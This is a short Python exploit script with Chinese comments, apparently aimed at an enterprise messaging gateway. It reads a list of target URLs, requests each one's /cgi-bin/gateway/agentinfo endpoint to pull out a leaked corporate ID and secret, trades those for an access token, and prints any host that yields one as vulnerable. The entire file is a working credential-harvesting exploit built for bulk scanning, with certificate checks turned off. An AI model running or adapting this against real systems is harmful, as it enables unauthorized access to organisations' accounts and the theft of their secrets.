import json
import requests
import argparse
import warnings

# 解析命令行参数
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='URL for agentinfo request')
parser.add_argument('-r', '--file', help='File containing URLs')
args = parser.parse_args()
warnings.filterwarnings("ignore")

# 读取包含URL的文本文件
urls = []
if args.file:
    with open(args.file, 'r') as file:
        urls = file.read().splitlines()
else:
    urls = [args.url]

for url in urls:
    # 发起agentinfo请求
    try:
        response = requests.get(url=f'{url}/cgi-bin/gateway/agentinfo', verify=False, timeout=3)
    except requests.exceptions.Timeout:
        print(f'Request timed out for URL: {url}')
        continue

    # 检查响应状态码
    if response.status_code != 200:
        print("\033[31m"+f'Failed to get agent info for URL: {url}/cgi-bin/gateway/agentinfo, 状态码{response.status_code}'+"\033[0m")
        continue
    if 'strcorpid' not in response.text:
        continue
    # 解析响应中的JSON数据
    res = response.content.decode("utf-8")
    data = json.loads(res)  # json转成python字典
    id = data['strcorpid']
    secret = data['Secret']

    # 发起gettoken请求
    get_token_url = f'{url}/cgi-bin/gettoken?corpid={id}&corpsecret={secret}'
    get_token_response = requests.get(get_token_url, verify=False)

    # 检查响应是否包含access_token并打印结果

    get_token_data = get_token_response.text
    if 'access_token' in get_token_data:
        data = json.loads(get_token_response.content.decode("utf-8"))  # json转成python字典
        access_token = data['access_token']
        print("\033[32m"+f'{url} 存在漏洞'+"\033[0m")
        print("\033[32m"+f'URL: {get_token_url}'+"\033[0m")
        print(f'Access Token: {access_token}')
